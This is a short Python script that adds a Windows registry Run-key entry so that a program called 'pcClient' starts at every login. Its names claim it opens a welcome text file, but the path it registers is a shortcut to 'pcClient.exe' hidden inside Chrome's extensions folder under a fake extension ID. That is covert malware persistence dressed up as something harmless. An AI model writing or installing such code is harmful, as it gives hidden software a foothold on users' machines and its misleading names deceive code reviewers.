import winreg
import os
def add_txt_to_startup(name, file_path):
    full_path = os.path.expandvars(file_path)
    registry_key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{full_path}"')
        winreg.CloseKey(key)
        print(f"Success! '{name}' will now open {full_path} at login.")
    except Exception as e:
        print(f"Oops, something went wrong: {e}")
app_label = "pcClient"
path_to_welcome_txt = r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Extensions\mrrooomhhqrqrggarakrkuxxerrttattht\pcClient.exe.lnk"
add_txt_to_startup(app_label, path_to_welcome_txt)
